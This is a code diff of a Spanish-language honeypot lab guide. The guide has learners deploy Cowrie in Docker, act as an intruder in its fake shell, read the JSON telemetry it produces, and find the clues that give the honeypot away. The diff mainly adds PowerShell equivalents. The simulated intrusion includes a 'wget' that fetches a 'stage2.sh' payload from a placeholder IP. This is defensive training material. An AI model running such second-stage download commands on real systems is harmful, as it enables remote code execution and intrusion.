@@ -96,7 +96,7 @@ docker compose up -d --build
 docker compose ps          <span class="c"># portal, cowrie y opencanary en "running"</span>
 
 <span class="c"># sin internet: docker load -i b4-lab-kit.tar</span>
-<span class="c">#   el .tar sale de github.com/Base4Security/eko2026-active-defense-labs/releases</span></pre></div><p class="text-sm text-gray-300 leading-relaxed"><strong class="text-white">Todos los comandos de esta ficha y de las que siguen se corren desde <code>mi-lab/</code></strong>, salvo que diga otra cosa.</p>
+<span class="c">#   el .tar sale de github.com/Base4Security/eko2026-active-defense-labs/releases</span></pre></div><p class="text-sm text-gray-300 leading-relaxed"><strong class="text-white">Todos los comandos de esta ficha y de las que siguen se corren desde <code>mi-lab/</code></strong>, salvo que diga otra cosa.</p><div class="callout is-pista"><div class="callout-title"><i class="fab fa-windows"></i>Si estás en Windows</div><div class="text-sm leading-relaxed text-gray-300"><p>Los bloques que cambian entre plataformas traen una pestaña <strong class="text-white">Windows</strong> arriba a la derecha, con el equivalente en <strong class="text-white">PowerShell</strong>. Apretala una vez y el resto del curso se acomoda solo: la elección se guarda para las diecisiete guías.</p><p class="mt-2">Los bloques sin pestaña corren igual en todos lados — Docker, Git, <code>ssh</code> y <code>nmap</code> son los mismos, y todo lo que se tipea <em>adentro</em> del shell falso corre en el contenedor Linux, no en tu máquina. Lo que hay que instalar aparte está en la <a class="eko-link-label" href="../index.html#preparacion">preparación del programa</a>.</p></div></div>
   </section>
   <section id="entrar" class="space-y-5">
 <h2 class="text-2xl font-black text-white border-l-4 border-base-orange pl-4 mb-5" data-wb-md-h="2">2 · Entrá como entraría un adversario</h2><p class="text-sm text-gray-300 leading-relaxed">Cualquier contraseña funciona. Estás en un shell falso: enumerá como alguien que acaba de conseguir acceso y todavía no sabe dónde cayó.</p><div class="unified-card is-static overflow-hidden"><div class="code-caption"><i class="fas fa-terminal"></i>Segunda terminal<button data-copy class="ml-auto text-gray-400 hover:text-base-orangeAlt transition-colors no-print"><i class="far fa-copy"></i> Copiar</button></div><pre class="code">ssh root@localhost -p 2222
@@ -109,7 +109,7 @@ wget http://198.51.100.10/stage2.sh    <span class="c"># no resuelve: importa el
 exit</pre></div>
   </section>
   <section id="contar" class="space-y-5">
-<h2 class="text-2xl font-black text-white border-l-4 border-base-orange pl-4 mb-5" data-wb-md-h="2">3 · Mirá lo que produjo</h2><div class="unified-card is-static overflow-hidden"><div class="code-caption"><i class="fas fa-terminal"></i>Telemetría<button data-copy class="ml-auto text-gray-400 hover:text-base-orangeAlt transition-colors no-print"><i class="far fa-copy"></i> Copiar</button></div><pre class="code"><span class="c"># crudo</span>
+<h2 class="text-2xl font-black text-white border-l-4 border-base-orange pl-4 mb-5" data-wb-md-h="2">3 · Mirá lo que produjo</h2><div class="unified-card is-static overflow-hidden"><div class="code-caption"><i class="fas fa-terminal"></i>Telemetría<span class="os-tabs no-print" data-os-tabs><button type="button" data-os="nix">macOS · Linux</button><button type="button" data-os="win">Windows</button></span><button data-copy class="text-gray-400 hover:text-base-orangeAlt transition-colors no-print"><i class="far fa-copy"></i> Copiar</button></div><pre class="code" data-os="nix"><span class="c"># crudo</span>
 docker compose logs --tail=40 cowrie
 
 <span class="c"># JSON estructurado, un evento por línea</span>
@@ -120,13 +120,32 @@ jq -c 'select(.eventid|test("login|command")) | {eventid,src_ip,username,input}'
   cowrie/log/cowrie.json
 
 <span class="c"># cuántos eventos produjo tu sesión</span>
-wc -l &lt; cowrie/log/cowrie.json</pre></div><p class="text-sm text-gray-300 leading-relaxed">El JSON se lee <strong class="text-white">desde el host</strong>, no con <code>docker compose exec</code>: la imagen de Cowrie es <em>distroless</em> y no trae <code>sh</code>, <code>cat</code> ni <code>tail</code>. El archivo llega ahí por el bind mount de <code>docker-compose.yml</code>, y por eso sobrevive a un <code>docker compose down</code> — que es lo que el E7 va a necesitar.</p><div class="unified-card is-static p-5"><label class="block text-xs uppercase tracking-[0.15em] text-gray-500 mb-2" data-wb-label="Cuántos eventos produjo tu sesión de dos minutos">Cuántos eventos produjo tu sesión de dos minutos</label><textarea class="fill-in" data-wb="eventos" rows="2" placeholder="El número, y cuál de esos eventos serviría como alerta."></textarea></div>
+wc -l &lt; cowrie/log/cowrie.json</pre><pre class="code" data-os="win"><span class="c"># crudo</span>
+docker compose logs --tail=40 cowrie
+
+<span class="c"># JSON estructurado, un evento por línea</span>
+Get-Content cowrie\log\cowrie.json -Tail 20
+
+<span class="c"># solo lo que importa (si tenés jq)</span>
+jq -c 'select(.eventid|test("login|command")) | {eventid,src_ip,username,input}' cowrie\log\cowrie.json
+
+<span class="c"># y si no instalaste jq, PowerShell lee JSON solo</span>
+Get-Content cowrie\log\cowrie.json | ConvertFrom-Json |
+  Where-Object { $_.eventid -match 'login|command' } |
+  Select-Object eventid, src_ip, username, input
+
+<span class="c"># cuántos eventos produjo tu sesión</span>
+(Get-Content cowrie\log\cowrie.json).Count</pre></div><p class="text-sm text-gray-300 leading-relaxed">El JSON se lee <strong class="text-white">desde el host</strong>, no con <code>docker compose exec</code>: la imagen de Cowrie es <em>distroless</em> y no trae <code>sh</code>, <code>cat</code> ni <code>tail</code>. El archivo llega ahí por el bind mount de <code>docker-compose.yml</code>, y por eso sobrevive a un <code>docker compose down</code> — que es lo que el E7 va a necesitar.</p><div class="unified-card is-static p-5"><label class="block text-xs uppercase tracking-[0.15em] text-gray-500 mb-2" data-wb-label="Cuántos eventos produjo tu sesión de dos minutos">Cuántos eventos produjo tu sesión de dos minutos</label><textarea class="fill-in" data-wb="eventos" rows="2" placeholder="El número, y cuál de esos eventos serviría como alerta."></textarea></div>
   </section>
   <section id="romper" class="space-y-5">
-<h2 class="text-2xl font-black text-white border-l-4 border-base-orange pl-4 mb-5" data-wb-md-h="2">4 · Rompelo</h2><p class="text-sm text-gray-300 leading-relaxed">Diez minutos buscando qué lo delata ante alguien atento. El honeypot está sin configurar y se cae rápido: banner, hostname, contenido del filesystem, comportamiento raro de un comando, fechas.</p><div class="unified-card is-static overflow-hidden"><div class="code-caption"><i class="fas fa-terminal"></i>Por dónde empezar<button data-copy class="ml-auto text-gray-400 hover:text-base-orangeAlt transition-colors no-print"><i class="far fa-copy"></i> Copiar</button></div><pre class="code">ssh -v root@localhost -p 2222 2>&1 | grep -i "remote software"
+<h2 class="text-2xl font-black text-white border-l-4 border-base-orange pl-4 mb-5" data-wb-md-h="2">4 · Rompelo</h2><p class="text-sm text-gray-300 leading-relaxed">Diez minutos buscando qué lo delata ante alguien atento. El honeypot está sin configurar y se cae rápido: banner, hostname, contenido del filesystem, comportamiento raro de un comando, fechas.</p><div class="unified-card is-static overflow-hidden"><div class="code-caption"><i class="fas fa-terminal"></i>Por dónde empezar<span class="os-tabs no-print" data-os-tabs><button type="button" data-os="nix">macOS · Linux</button><button type="button" data-os="win">Windows</button></span><button data-copy class="text-gray-400 hover:text-base-orangeAlt transition-colors no-print"><i class="far fa-copy"></i> Copiar</button></div><pre class="code" data-os="nix">ssh -v root@localhost -p 2222 2>&1 | grep -i "remote software"
 docker inspect b4-cowrie --format '{{.Created}} · {{.Config.Image}}'
 
 <span class="c"># y adentro del shell falso:</span>
+hostname ; uname -a ; ls -la /home ; last ; df -h ; ps aux</pre><pre class="code" data-os="win">ssh -v root@localhost -p 2222 2>&1 | Select-String "remote software"
+docker inspect b4-cowrie --format '{{.Created}} · {{.Config.Image}}'
+
+<span class="c"># y adentro del shell falso — esto ya corre en Linux, no en tu Windows:</span>
 hostname ; uname -a ; ls -la /home ; last ; df -h ; ps aux</pre></div><p class="text-sm text-gray-300 leading-relaxed">Una fila por delator. La columna de la derecha es la que vas a ejecutar en el E5.</p><div class="unified-card is-static p-5" data-wb-table="delatores" data-wb-min="3"><div class="table-scroll"><table class="data-table"><thead><tr><th>Qué lo delata</th><th>Cómo lo viste</th><th>Qué habría que cambiar</th><th></th></tr></thead><tbody data-wb-body></tbody></table></div><p class="wb-empty" data-wb-empty hidden>No hay filas. Agregá una para empezar.</p><template data-wb-row><tr><td class="is-editable" style="min-width:190px"><div class="wb-cell" contenteditable="true" data-wb-col="delator" data-ph="ej. banner dice OpenSSH 6.0p1"></div></td><td class="is-editable" style="min-width:180px"><div class="wb-cell" contenteditable="true" data-wb-col="como" data-ph="el comando exacto"></div></td><td class="is-editable" style="min-width:200px"><div class="wb-cell" contenteditable="true" data-wb-col="fix" data-ph="la corrección concreta"></div></td><td class="wb-rowtools"><button class="wb-del" type="button" title="Eliminar fila" aria-label="Eliminar fila"><i class="fas fa-xmark"></i></button></td></tr></template><div class="wb-tablefoot no-print"><button class="wb-btn wb-add" type="button" data-wb-add><i class="fas fa-plus"></i>Agregar delator</button><span class="wb-count"></span></div></div>
   </section>
 
